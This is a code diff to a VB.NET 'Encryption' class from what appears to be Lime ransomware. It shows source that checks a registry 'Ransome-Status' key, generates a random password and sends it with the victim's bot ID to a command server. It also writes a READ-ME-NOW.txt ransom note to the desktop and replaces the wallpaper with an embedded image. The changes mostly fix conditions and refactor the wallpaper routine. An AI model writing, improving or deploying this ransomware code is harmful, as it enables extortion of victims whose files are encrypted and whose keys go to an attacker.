@@ -95,14 +95,15 @@ Public Class Encryption
         Try
 
             Dim readValue = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", "Ransome-Status", Nothing)
-            If readValue = "Encrypted" Or readValue = "Encryption in progress..." Or readValue = "Encryption in progress..." Then
-                Main.Send("MSG" + SPL + "Ransomware is already started!")
+            If readValue = "Encrypted" Or readValue = "Encryption in progress..." Or readValue = "Decryption in progress..." Then
                 Try
                     Main.C.Close()
                     Main.C = Nothing
                 Catch ex As Exception
                 End Try
+                Exit Sub
             End If
+
             password = CreatePassword(15)
             Threading.Thread.CurrentThread.Sleep(1000)
             Main.Send("Key" + SPL + ID.Bot + SPL + password)
@@ -136,6 +137,7 @@ Public Class Encryption
         Catch ex As Exception
         End Try
 
+        Exit Sub
     End Sub
 
     Public Sub User_Dir(ByVal password As String)
@@ -166,22 +168,23 @@ Public Class Encryption
         num += 1
     End Sub
 
-    Private Declare Ansi Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (uAction As Integer, uParam As Integer, <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.VBByRefStr)> ByRef lpvParam As String, fuWinIni As Integer) As Integer
+    Private Const SPI_SETDESKWALLPAPER As Integer = &H14
+    Private Const SPIF_UPDATEINIFILE As Integer = &H1
+    Private Const SPIF_SENDWININICHANGE As Integer = &H2
+    Private Declare Auto Function SystemParametersInfo Lib "user32.dll" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer
     Public Sub messageCreator()
         Try
+
+            Const WallpaperFile As String = "c:\wallpaper.bmp"
             Dim path As String = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
             Dim fullpath As String = path + "\READ-ME-NOW.txt"
             Dim Message As String() = {Mynote, "Your ID is " & ID.Bot & ""}
             File.WriteAllLines(fullpath, Message)
 
 
-            Dim NewFile = IO.Path.GetTempFileName + ".jpeg"
-            File.WriteAllBytes(NewFile, Convert.FromBase64String(Mywallpaper))
-
-            Dim registryKey As Microsoft.Win32.RegistryKey = My.Computer.Registry.CurrentUser.OpenSubKey("Control Panel\Desktop", True)
-            registryKey.SetValue("WallpaperStyle", "2")
-            registryKey.SetValue("TileWallpaper", "0")
-            SystemParametersInfo(20, 0, NewFile, 1)
+            Dim MYW = IO.Path.GetTempPath + "\LimeWALL.jpeg"
+            File.WriteAllBytes(MYW, Convert.FromBase64String(Mywallpaper))
+            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, MYW, SPIF_UPDATEINIFILE Or SPIF_SENDWININICHANGE)
         Catch ex As Exception
         End Try
     End Sub
